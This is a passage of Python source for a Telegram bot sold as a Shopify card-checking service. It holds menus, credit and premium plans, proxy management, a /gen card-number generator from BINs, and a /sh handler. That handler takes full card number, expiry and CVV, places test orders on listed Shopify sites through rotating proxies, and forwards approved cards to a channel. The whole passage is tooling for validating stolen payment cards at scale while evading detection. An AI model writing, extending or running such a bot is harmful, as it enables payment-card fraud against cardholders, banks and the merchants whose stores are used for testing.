    allowed_responses = [
        "ORDER_PLACED",
        "CARD_DECLINED", 
        "GENERIC_ERROR",
        "OTP_REQUIRED",
        "MISMATCHED_BILL",
        "INSUFFICIENT_FUNDS"
    ]
    
    if clean_response is None:
        return False
    if not clean_response:
        return False
    clean_response = str(clean_response)
    if clean_response in allowed_responses:
        return True
    clean_upper = clean_response.upper()
    for allowed in allowed_responses:
        if allowed in clean_upper:
            return True
    return False

def remove_bad_site(site_url):
    try:
        if not site_url:
            return False
        site_url = site_url.replace('https://', '').replace('http://', '').strip('/')
        if not os.path.exists(SITES_FILE):
            return False
        with open(SITES_FILE, 'r') as f:
            sites = [line.strip() for line in f if line.strip()]
        if site_url not in sites:
            return False
        sites.remove(site_url)
        with open(SITES_FILE, 'w') as f:
            f.write('\n'.join(sites))
            if sites:
                f.write('\n')
        print(f"🗑️ تم حذف الموقع: {site_url}")
        return True
    except Exception as e:
        print(f"⚠️ خطأ في حذف الموقع {site_url}: {e}")
        return False

async def safe_edit_message_async(msg, text, reply_markup=None, parse_mode="HTML"):
    try:
        await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        return True
    except Exception as e:
        logger.error(f"Failed to update message: {e}")
        return False

def start_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Checker Menu"),
                callback_data="checker_menu",
                icon_custom_emoji_id=EMOJI["checker_menu"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Proxy Control"),
                callback_data="proxy_control",
                icon_custom_emoji_id=EMOJI["proxy"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("My Account"),
                callback_data="my_account",
                icon_custom_emoji_id=EMOJI["my_account"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Admin Panel"),
                callback_data="admin_panel",
                icon_custom_emoji_id=EMOJI["admin_panel"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("Upgrade to Premium"),
                callback_data="upgrade_premium",
                icon_custom_emoji_id=EMOJI["upgrade"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Official Channel"),
                url=REQUIRED_CHANNEL_LINK,
                icon_custom_emoji_id=EMOJI["channel"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("Support"),
                callback_data="support",
                icon_custom_emoji_id=EMOJI["support"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def checker_menu_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Back"),
                callback_data="back_start",
                icon_custom_emoji_id=EMOJI["back"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def proxy_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Show"),
                callback_data="show_proxies",
                icon_custom_emoji_id=EMOJI["show"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Add"),
                callback_data="add_proxy_manual",
                icon_custom_emoji_id=EMOJI["plus"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("Delete All"),
                callback_data="del_proxies",
                icon_custom_emoji_id=EMOJI["delete"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Check"),
                callback_data="check_proxies",
                icon_custom_emoji_id=EMOJI["check_yes"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("Back"),
                callback_data="back_start",
                icon_custom_emoji_id=EMOJI["back"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def my_account_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Back"),
                callback_data="back_start",
                icon_custom_emoji_id=EMOJI["back"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def admin_panel_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Back"),
                callback_data="back_start",
                icon_custom_emoji_id=EMOJI["back"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def back_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("Back"),
                callback_data="back_start",
                icon_custom_emoji_id=EMOJI["back"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def subscription_required_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(
                text=to_bold("📢 اشترك في القناة"),
                url=REQUIRED_CHANNEL_LINK,
                icon_custom_emoji_id=EMOJI["info"],
                style="primary"
            )
        ],
        [
            InlineKeyboardButton(
                text=to_bold("✅ تم الاشتراك"),
                callback_data="check_subscription",
                icon_custom_emoji_id=EMOJI["check_yes"],
                style="primary"
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def mass_keyboard(approved, declined, total, running=True, insufficient=0, unsupported=0, otp=0, last_response="Waiting..."):
    keyboard = []
    
    keyboard.append([
        InlineKeyboardButton(
            text=to_bold(f"{last_response}"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["info"],
            style="primary"
        )
    ])
    
    if running:
        keyboard.append([InlineKeyboardButton(
            text=to_bold("Processing..."),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["loading"],
            style="primary"
        )])
    else:
        keyboard.append([InlineKeyboardButton(
            text=to_bold("Finished!"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["success"],
            style="primary"
        )])
    
    keyboard.append([
        InlineKeyboardButton(
            text=to_bold(f"Approved: {approved}"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["approved"],
            style="primary"
        ),
        InlineKeyboardButton(
            text=to_bold(f"Declined: {declined}"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["declined"],
            style="primary"
        )
    ])
    
    keyboard.append([
        InlineKeyboardButton(
            text=to_bold(f"Insufficient: {insufficient}"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["insufficient"],
            style="primary"
        ),
        InlineKeyboardButton(
            text=to_bold(f"OTP: {otp}"),
            callback_data="noop",
            icon_custom_emoji_id=EMOJI["otp"],
            style="primary"
        )
    ])
    
    if unsupported > 0:
        keyboard.append([
            InlineKeyboardButton(
                text=to_bold(f"Unsupported: {unsupported}"),
                callback_data="noop",
                icon_custom_emoji_id=EMOJI["unsupported"],
                style="primary"
            )
        ])
    
    if running:
        keyboard.append([
            InlineKeyboardButton(
                text=to_bold(f"Total: {total}"),
                callback_data="noop",
                icon_custom_emoji_id=EMOJI["total"],
                style="primary"
            ),
            InlineKeyboardButton(
                text=to_bold("Stop"),
                callback_data="stop_mass",
                icon_custom_emoji_id=EMOJI["stop"],
                style="primary"
            )
        ])
    else:
        keyboard.append([InlineKeyboardButton(
            text=to_bold(f"Total: {total} | Done"),
            callback_data="back_start",
            icon_custom_emoji_id=EMOJI["total"],
            style="primary"
        )])
    
    return InlineKeyboardMarkup(keyboard)

def get_start_text(user_id):
    stats = get_user_stats(user_id)
    plan_text = stats['plan']
    
    if plan_text in ['Owner', 'Admin']:
        plan_show = f"{get_emoji_text('crown')} {to_bold(plan_text)}"
    elif plan_text == 'Premium':
        plan_show = f"{get_emoji_text('premium')} {to_bold(plan_text)}"
    else:
        plan_show = f"{get_emoji_text('free')} {to_bold(plan_text)}"
    
    proxy_status_text = f"{get_emoji_text('check_yes') if stats['proxy'] == 'Set' else get_emoji_text('check_no')} {to_bold(stats['proxy'])}"
    
    return f"""{to_bold('Welcome To Infinity Shopify Bot')} {get_emoji_text('infinity')}

{get_emoji_text('plan')} {to_bold('Plan:')} {plan_show}
{get_emoji_text('gateway')} {to_bold('Gateway:')} {to_bold('Shopify Payments')}
{get_emoji_text('credit')} {to_bold('Credits:')} {to_bold(str(stats['credits']))}
{get_emoji_text('proxy')} {to_bold('Proxy:')} {proxy_status_text}

{get_emoji_text('dev')} {to_bold('Dev:')} @hhhiqh - @v_dark"""

def get_checker_menu_text():
    tools_icon = get_emoji_text('tools')
    shopify_icon = get_emoji_text('shopify')
    mass_icon = get_emoji_text('mass')
    gen_icon = get_emoji_text('gen')
    credit_icon = get_emoji_text('credit')
    info_icon = get_emoji_text('info')
    premium_icon = get_emoji_text('premium')
    clover_icon = get_emoji_text('gateway')
    
    return f"""{tools_icon} 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗖𝗺𝗱𝘀

𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:

{shopify_icon} /𝘀𝗵 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩 - 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 - 𝗦𝗵𝗼𝗽𝗶𝗳𝘆
{mass_icon} /𝗺𝘀 - 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 - 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 (𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗳𝗶𝗹𝗲)
{gen_icon} /𝗴𝗲𝗻 𝗕𝗜𝗡 - 𝗖𝗖 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿
{credit_icon} /𝗯𝗮𝗹𝗮𝗻𝗰𝗲 - 𝗖𝗵𝗲𝗰𝗸 𝗕𝗮𝗹𝗮𝗻𝗰𝗲

{info_icon} 𝗦𝗵𝗼𝗽𝗶𝗳𝘆: 𝟭 𝗰𝗿𝗲𝗱𝗶𝘁 𝗽𝗲𝗿 𝗰𝗵𝗲𝗰𝗸
"""

def get_proxy_control_text(user_id):
    user = get_user(user_id)
    proxies = get_user_proxies(user_id)
    count = len(proxies)
    
    proxy_icon = get_emoji_text('proxy')
    user_icon = get_emoji_text('user')
    check_no_icon = get_emoji_text('check_no')
    check_yes_icon = get_emoji_text('check_yes')
    info_icon = get_emoji_text('info')
    
    text = f"""{proxy_icon} 𝗣𝗥𝗢𝗫𝗬 𝗖𝗢𝗡𝗧𝗥𝗢𝗟

{user_icon} 𝗨𝘀𝗲𝗿: @{user.get('username', 'N/A')}
{proxy_icon} 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: {count}

"""
    if count == 0:
        text += f"""{check_no_icon} 𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗙𝗼𝘂𝗻𝗱!

{info_icon} 𝗨𝘀𝗲 𝗔𝗗𝗗 𝘁𝗼 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀"""
    else:
        text += f"""{check_yes_icon} 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 {count} 𝗽𝗿𝗼𝘅𝘆(𝗶𝗲𝘀) 𝘀𝗮𝘃𝗲𝗱

{info_icon} 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗺𝗮𝗻𝗮𝗴𝗲 𝘁𝗵𝗲𝗺:"""
    
    return text

def get_my_account_text(user_id):
    user = get_user(user_id)
    stats = get_user_stats(user_id)
    plan_text = stats['plan']
    
    if plan_text in ['Owner', 'Admin']:
        plan_show = f"{get_emoji_text('crown')} {to_bold(plan_text)}"
    elif plan_text == 'Premium':
        plan_show = f"{get_emoji_text('premium')} {to_bold(plan_text)}"
    else:
        plan_show = f"{get_emoji_text('free')} {to_bold(plan_text)}"
    
    proxies = get_user_proxies(user_id)
    proxy_count = len(proxies)
    proxy_status = "✅" if proxy_count > 0 else "❌"
    
    return f"""{get_emoji_text('user')} {to_bold('MY ACCOUNT')}

{get_emoji_text('id')} {to_bold('ID:')} <code>{user_id}</code>
{get_emoji_text('user')} {to_bold('Username:')} @{user.get('username', 'N/A')}
{get_emoji_text('plan')} {to_bold('Plan:')} {plan_show}
{get_emoji_text('credit')} {to_bold('Credits:')} {stats['credits']}
{get_emoji_text('proxy')} {to_bold('Proxies:')} {proxy_status} ({proxy_count})

{get_emoji_text('info')} {to_bold('Use /me for more details')}"""

def get_admin_panel_text():
    return f"""{get_emoji_text('admin')} {to_bold('ADMIN PANEL')}

{get_emoji_text('code')} /code [credits] - {to_bold('Create code')}
{get_emoji_text('admin')} /admin [user_id] - {to_bold('Add admin')}
{get_emoji_text('remove')} /remove [user_id] - {to_bold('Remove user')}
{get_emoji_text('ban')} /ban [user_id] - {to_bold('Ban user')}
{get_emoji_text('unban')} /unban [user_id] - {to_bold('Unban user')}
{get_emoji_text('vip')} /premium_users - {to_bold('Premium users')}
{get_emoji_text('user')} /users - {to_bold('Export users')}
{get_emoji_text('site')} /add_site [url] - {to_bold('Add site')}
{get_emoji_text('site')} /sites - {to_bold('List sites')}
{get_emoji_text('turn_off')} /turn_off - {to_bold('Maintenance')}"""

def get_buy_plan_text(user_id):
    stats = get_user_stats(user_id)
    plan_text = stats['plan']
    if plan_text in ['Owner', 'Admin']:
        plan_show = f"{get_emoji_text('crown')} {to_bold(plan_text)}"
    elif plan_text == 'Premium':
        plan_show = f"{get_emoji_text('premium')} {to_bold(plan_text)}"
    else:
        plan_show = f"{get_emoji_text('free')} {to_bold(plan_text)}"
    
    return f"""{get_emoji_text('buy')} {to_bold('UPGRADE TO PREMIUM')}

{get_emoji_text('warning')} {to_bold('Your Plan:')} {plan_show}

{get_emoji_text('credit')} {to_bold('1000 Credit: 100 LE')}
{get_emoji_text('credit')} {to_bold('3000 Credit: 300 LE')}
{get_emoji_text('credit')} {to_bold('5000 Credit: 500 LE')}
{get_emoji_text('credit')} {to_bold('10000 Credit: 1000 LE')}
{get_emoji_text('credit')} {to_bold('Pay Via Fawry or VF-Cash')}

{get_emoji_text('dm')} {to_bold('DM: @DBZxK')}"""

def get_support_text():
    return f"""{get_emoji_text('dm')} {to_bold('SUPPORT')}

{get_emoji_text('info')} {to_bold('For any issues or inquiries:')}

{get_emoji_text('dm')} {to_bold('Contact:')} @hhhiqh

{get_emoji_text('plus')} {to_bold('Report bugs or suggest features')}
{get_emoji_text('buy')} {to_bold('For purchasing credits')}"""

def get_maintenance_text():
    return f"""{get_emoji_text('warning')} {to_bold('⚠️ Bot Under Maintenance')}

{get_emoji_text('info')} {to_bold('The bot is currently under maintenance.')}
{to_bold('Please try again later.')}

{get_emoji_text('dev')} {to_bold('Dev:')} @hhhiqh - @v_dark"""

def get_subscription_required_text():
    return f"""{get_emoji_text('lock')} {to_bold('⚠️ Subscription Required')}

{get_emoji_text('info')} {to_bold('You must join our channel to use this bot!')}

{get_emoji_text('plus')} {to_bold('Please subscribe to the channel and click the button below.')}"""

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    await query.answer()
    
    try:
        if query.data == "back_start":
            text = get_start_text(user_id)
            try:
                await query.message.edit_caption(caption=text, reply_markup=start_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=start_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "checker_menu":
            text = get_checker_menu_text()
            try:
                await query.message.edit_caption(caption=text, reply_markup=checker_menu_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=checker_menu_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "proxy_control":
            text = get_proxy_control_text(user_id)
            try:
                await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "my_account":
            text = get_my_account_text(user_id)
            try:
                await query.message.edit_caption(caption=text, reply_markup=my_account_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=my_account_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "admin_panel":
            if not is_admin(user_id):
                await query.answer("❌ Access Denied! You are not an admin.", show_alert=True)
                return
            text = get_admin_panel_text()
            try:
                await query.message.edit_caption(caption=text, reply_markup=admin_panel_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=admin_panel_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "upgrade_premium":
            text = get_buy_plan_text(user_id)
            try:
                await query.message.edit_caption(caption=text, reply_markup=back_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=back_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "support":
            text = get_support_text()
            try:
                await query.message.edit_caption(caption=text, reply_markup=back_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=back_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "check_subscription":
            if check_user_subscription(user_id):
                await query.answer("✅ تم التحقق من اشتراكك!")
                text = get_start_text(user_id)
                try:
                    await query.message.edit_caption(caption=text, reply_markup=start_keyboard(), parse_mode="HTML")
                except:
                    await query.message.edit_text(text, reply_markup=start_keyboard(), parse_mode="HTML")
            else:
                await query.answer("❌ لم تشترك بعد! الرجاء الاشتراك ثم اضغط على الزر.", show_alert=True)
            return
        
        if query.data == "stop_mass":
            if user_id in mass_check_running:
                mass_check_running[user_id] = None
            for check_id in list(active_checks.keys()):
                active_checks[check_id] = False
            await query.answer("🛑 Stopped!")
            stop_icon = get_emoji_text('stop')
            try:
                await query.message.edit_caption(caption=f"{stop_icon} {to_bold('Mass Check Stopped!')}", reply_markup=start_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(f"{stop_icon} {to_bold('Mass Check Stopped!')}", reply_markup=start_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "noop":
            return
        
        if query.data == "show_proxies":
            proxies = get_user_proxies(user_id)
            if not proxies:
                try:
                    await query.message.edit_caption(
                        caption=f"{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}",
                        reply_markup=proxy_control_keyboard(),
                        parse_mode="HTML"
                    )
                except:
                    await query.message.edit_text(
                        f"{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}",
                        reply_markup=proxy_control_keyboard(),
                        parse_mode="HTML"
                    )
                return
            
            file_content = "\n".join(proxies)
            file_name = f"proxies_{user_id}.txt"
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(file_content)
            
            with open(file_name, 'rb') as f:
                await query.message.reply_document(
                    f, 
                    caption=f"{get_emoji_text('proxy')} {to_bold(f'Your Proxies ({len(proxies)}):')}"
                )
            
            os.remove(file_name)
            
            text = f"{get_emoji_text('success')} {to_bold(f'Proxies file sent! ({len(proxies)} proxies)')}"
            try:
                await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "check_proxies":
            await query.answer("🔍 Checking proxies...")
            proxies = get_user_proxies(user_id)
            
            if not proxies:
                text = f"{get_emoji_text('check_no')} {to_bold('No proxies to check!')}"
                try:
                    await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
                except:
                    await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
                return
            
            text = f"""{get_emoji_text('loading')} {to_bold('Checking proxies in background...')}

{get_emoji_text('proxy')} {to_bold(f'Checking {len(proxies)} proxies...')}
{get_emoji_text('info')} {to_bold('You can continue using the bot.')}"""
            
            try:
                await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            
            asyncio.create_task(
                check_proxies_background(update, context, user_id, query, proxies)
            )
            return
        
        if query.data == "add_proxy_manual":
            text = f"""{get_emoji_text('proxy')} {to_bold('Add Proxy')}

{to_bold('Use command:')}
<code>/add_proxy IP:PORT:USER:PASS</code>

{to_bold('For multiple proxies:')}
<code>/add_proxy
IP:PORT:USER:PASS
IP:PORT:USER:PASS
IP:PORT:USER:PASS</code>

{get_emoji_text('info')} {to_bold('Proxies will be added to existing ones')}
{get_emoji_text('check_yes')} {to_bold('Proxies are tested automatically')}

{get_emoji_text('plus')} {to_bold('Example:')}
<code>/add_proxy
1.1.1.1:8080:user:pass
2.2.2.2:3128:user2:pass2</code>"""
            
            try:
                await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            return
        
        if query.data == "del_proxies":
            proxies = get_user_proxies(user_id)
            if not proxies:
                try:
                    await query.message.edit_caption(
                        caption=f"{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}",
                        reply_markup=proxy_control_keyboard(),
                        parse_mode="HTML"
                    )
                except:
                    await query.message.edit_text(
                        f"{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}",
                        reply_markup=proxy_control_keyboard(),
                        parse_mode="HTML"
                    )
                return
            
            delete_user_proxy(user_id)
            
            text = f"""{get_emoji_text('success')} {to_bold('All Proxies Deleted!')}

{get_emoji_text('delete')} {to_bold(f'{len(proxies)} proxy(s) removed.')}

{get_emoji_text('plus')} {to_bold('Use ADD to add new proxies.')}"""
            
            try:
                await query.message.edit_caption(caption=text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            except:
                await query.message.edit_text(text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            return
        
        try:
            await query.message.edit_caption(caption="Unknown option.", reply_markup=start_keyboard(), parse_mode="HTML")
        except:
            await query.message.edit_text("Unknown option.", reply_markup=start_keyboard(), parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Error in callback_handler: {e}")
        try:
            await query.message.edit_text(f"Error: {str(e)}", parse_mode="HTML")
        except:
            pass

FREE_CREDITS_ON_START = 250

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "N/A"
    
    existing_user = get_user(user_id)
    is_new = existing_user is None
    
    created, credits_added = create_user(user_id, username, first_name)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {get_emoji_text('error')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    if not check_user_subscription(user_id):
        await update.message.reply_text(get_subscription_required_text(), reply_markup=subscription_required_keyboard(), parse_mode="HTML")
        return
    
    text = get_start_text(user_id)
    
    if is_new and credits_added > 0:
        welcome_text = f"""{get_emoji_text('success')} {to_bold('Welcome New User!')}
{get_emoji_text('credit')} {to_bold(f'You received {credits_added} free credits!')}

{text}"""
        try:
            await update.message.reply_video(VIDEO_URL, caption=welcome_text, reply_markup=start_keyboard(), parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error sending video: {e}")
            await update.message.reply_text(welcome_text, reply_markup=start_keyboard(), parse_mode="HTML")
    else:
        try:
            await update.message.reply_video(VIDEO_URL, caption=text, reply_markup=start_keyboard(), parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error sending video: {e}")
            await update.message.reply_text(text, reply_markup=start_keyboard(), parse_mode="HTML")

async def shopify_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if not check_user_subscription(user_id):
        await update.message.reply_text(get_subscription_required_text(), reply_markup=subscription_required_keyboard(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    if not is_premium(user_id):
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Premium Only!')}

{get_emoji_text('info')} {to_bold('This command is for premium users only.')}
{get_emoji_text('buy')} {to_bold('Subscribe now to get access.')}

{get_emoji_text('dm')} {to_bold('Contact:')} @hhhiqh""", parse_mode="HTML")
        return
    
    if not is_admin(user_id):
        user_proxies = get_user_proxies(user_id)
        if not user_proxies:
            await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Proxy Required!')}

{get_emoji_text('proxy')} {to_bold('You must add a proxy first!')}

{get_emoji_text('plus')} {to_bold('Use command:')}
<code>/add_proxy IP:PORT:USER:PASS</code>

{get_emoji_text('info')} {to_bold('You can add multiple proxies and they will work automatically.')}""", parse_mode="HTML")
            return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"""{get_emoji_text('shopify')} {to_bold('Usage:')}

<code>/sh CC|MM|YYYY|CVV</code>

{get_emoji_text('plus')} {to_bold('Example:')}
<code>/sh 4111111111111111|12|2028|123</code>

{get_emoji_text('proxy')} {to_bold('Your proxy will be used automatically.')}
{get_emoji_text('site')} {to_bold('A site will be selected automatically from sites list.')}""", parse_mode="HTML")
        return
    
    card_input = args[1]
    try:
        cc, mes, ano, cvv = card_input.split('|')
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid format!')}\n\n{get_emoji_text('plus')} {to_bold('Use:')} <code>CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return
    
    if not deduct_credit(user_id):
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('No Credits!')}

{get_emoji_text('credit')} {to_bold('Your balance is insufficient.')}
{get_emoji_text('buy')} {to_bold('Subscribe to get credits.')}""", parse_mode="HTML")
        return
    
    site = get_random_site_for_user(user_id)
    if not site:
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('No Sites Available!')}

{get_emoji_text('site')} {to_bold('No sites found in sites.txt file.')}
{get_emoji_text('admin')} {to_bold('Add sites using /add_site')}""", parse_mode="HTML")
        return
    
    user_proxies = get_user_proxies(user_id)
    proxy = None
    
    if is_owner(user_id):
        if user_proxies:
            proxy = get_random_proxy_for_user(user_id, user_proxies)
        else:
            await update.message.reply_text(
                f"{get_emoji_text('info')} {to_bold('Owner Mode: Checking without proxy')}",
                parse_mode="HTML"
            )
    else:
        if not user_proxies:
            await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('No Proxy Available!')}

{get_emoji_text('proxy')} {to_bold('No proxy available.')}
{get_emoji_text('plus')} {to_bold('Use /add_proxy to add a proxy.')}""", parse_mode="HTML")
            return
        proxy = get_random_proxy_for_user(user_id, user_proxies)
    
    msg_text = f"""{get_emoji_text('check')} {to_bold('Checking Shopify...')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{cc[:6]}...{cc[-4:]}</code>"""
    
    if proxy:
        msg_text += f"\n{get_emoji_text('proxy')} {to_bold('Proxy ⇾')} <code>{proxy[:20]}...</code>"
    else:
        msg_text += f"\n{get_emoji_text('proxy')} {to_bold('Proxy ⇾')} {to_bold('None (Owner Mode)')}"
    
    msg_text += f"\n\n{get_emoji_text('loading')} {to_bold('Processing...')}"
    
    msg = await update.message.reply_text(msg_text, parse_mode="HTML")
    
    try:
        start_time = time.time()
        success, message_text, gateway, price, currency = await shopify_check_card_async(
            cc, mes, ano, cvv, site, None, proxy
        )
        time_taken = f"{time.time() - start_time:.2f}s"
        
        if message_text is None:
            message_text = "UNKNOWN_ERROR"
        if gateway is None:
            gateway = "UNKNOWN"
        if price is None:
            price = "0.00"
        if currency is None:
            currency = "USD"
        
        try:
            price_float = float(price)
            price_display = f"{price_float:.2f}"
        except:
            price_display = "0.00"
        
        stats = get_user_stats(user_id)
        user_plan = stats['plan']
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        clean_response = extract_clean_response(message_text)
        card_formatted = format_card_text(cc, mes, ano, cvv)
        
        result_text = f"""{get_emoji_text('declined')} {to_bold('DECLINED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
        
        if success and clean_response == "ORDER_PLACED":
            result_text = f"""{get_emoji_text('approved')} {to_bold('APPROVED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {to_bold('ORDER_PLACED')}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            await send_approved_to_channel_shopify_async(cc, mes, ano, cvv, price_display, "ORDER_PLACED", time_taken, username, user_plan, gateway)
        
        elif success and "LIVE" in str(message_text).upper():
            result_text = f"""{get_emoji_text('approved')} {to_bold('APPROVED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
